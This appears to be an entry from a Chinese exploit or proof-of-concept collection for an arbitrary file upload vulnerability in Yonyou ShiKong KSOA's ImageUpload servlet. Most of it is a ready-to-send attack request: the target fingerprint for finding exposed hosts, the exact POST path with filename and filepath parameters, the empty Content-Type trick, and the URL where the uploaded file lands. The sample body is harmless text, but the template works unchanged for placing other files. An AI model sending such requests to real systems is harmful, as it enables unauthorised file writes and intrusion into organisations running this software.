# 用友时空KSOAImageUpload任意文件上传漏洞

- **系统**：用友　|　**类型**：文件上传　|　**CVE**：—
- **指纹**：`app.name="用友时空 KSOA"`
- **请求**：`POST /servlet/com.sksoft.bill.ImageUpload?filename=1.txt&filepath=/ HTTP/1.1`

**请求体 / payload**
```
⚠️：`Content-type``header`头需为空
Host: {hostname}
Content-type:
Content-Length: 5
hello

上传文件路径
http://xx.xx.xx.xx/pictures/1.txt
```

**其他**
- 用友时空KSOA ImageUpload 任意文件上传漏洞: * 一、漏洞简介
* 二、影响版本
* 三、资产测绘
* 四、漏洞复现
***
- 版本: * 用友时空KSOA